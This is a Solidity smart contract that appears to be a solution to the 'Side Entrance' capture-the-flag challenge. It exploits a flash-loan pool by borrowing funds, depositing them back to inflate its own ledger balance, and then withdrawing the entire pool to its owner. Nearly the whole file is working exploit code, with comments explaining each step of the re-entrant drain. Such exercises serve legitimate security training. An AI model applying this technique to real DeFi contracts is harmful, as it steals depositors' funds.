pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

import "hardhat/console.sol";

contract SideEntranceLenderPoolAttacker {
    using Address for address payable;

    address immutable owner;
    SideEntranceLenderPool immutable pool;
    uint256 stackLevel;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() public {
        require(msg.sender == owner);
        stackLevel = 0;
        uint256 poolBalance = address(pool).balance;
        uint256 halfPoolBalance = poolBalance / 2;
        // request a flash loan for the half balance of the pool, since we'll be
        // making two flash loans here
        pool.flashLoan(halfPoolBalance);
        // reset the stack level: flashLoan is done recursing
        stackLevel = 0;
        // call pool.withdraw to pull out the funds we deposited earlier
        pool.withdraw();
        payable(owner).sendValue(poolBalance);
    }

    function execute() external payable {
        require(msg.sender == address(pool));

        if (stackLevel == 0) {
            // this is the first time flashLoan has invoked us
            stackLevel += 1;
            // send msg.value to pool.deposit(), increasing our balance on the
            // pool's ledger
            pool.deposit{value: msg.value}();
            // re-enter flashLoan, ask for the same amount to get the funds back!
            pool.flashLoan(msg.value);
        } else {
            // this is the second time flashLoan has invoked us
            // we now have the funds back
            // return the funds to the pool to satisfy the requirements of the loan
            pool.deposit{value: msg.value}();
        }
    }

    receive() external payable {}
}
